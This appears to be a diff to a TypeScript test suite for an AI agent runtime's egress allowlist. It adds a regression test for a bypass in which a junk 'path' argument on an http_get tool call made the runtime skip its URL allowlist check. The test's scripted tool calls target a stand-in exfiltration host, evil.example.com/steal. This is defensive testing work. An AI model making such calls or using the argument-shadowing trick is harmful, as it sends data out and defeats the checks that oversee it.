@@ -90,6 +90,10 @@ function harness(allowHost: boolean) {
     profile: CONSERVATIVE,
     model: 'test',
     tools,
+    // The loop derives the resource from these, so the harness must hand them
+    // over exactly as buildRuntime does — a harness that skips this tests a
+    // loop that production does not run.
+    capabilities: new Map(decls.map((d) => [d.id, d])),
     decide: createDecide({
       capabilities: new Map(decls.map((d) => [d.id, d])),
       budgetExhausted: () => false,
@@ -145,5 +149,29 @@ describe('egress allowlist, through a real turn', () => {
     });
 
     expect(h.fetched).toEqual(['https://evil.example.com/steal']);
+  });
+});
+
+describe('the exploit that the first fix left open', () => {
+  it('a junk path argument cannot shadow the url and skip the allowlist', async () => {
+    // Found by review. `http_get({url, path:'x'})`: the loop checked `path`
+    // first, built a path resource, and the kernel's egress branch — which
+    // required `resource.kind === 'url'` — was skipped entirely, falling
+    // through to medium/reversible = allow. Measured before the fix: deny
+    // without the key, fetch with it, for a taint-2 group member.
+    const h = harness(false);
+    h.deps.provider = new Scripted([
+      callTool('http_get', { url: 'https://evil.example.com/steal', path: 'anything' }),
+    ]);
+
+    await runTurn(h.deps, {
+      principal: member,
+      tenant: 'group:telegram:42',
+      surface: 'telegram',
+      session: h.deps.sessions.open('s3'),
+      text: 'leggi',
+    });
+
+    expect(h.fetched).toEqual([]);
   });
 });
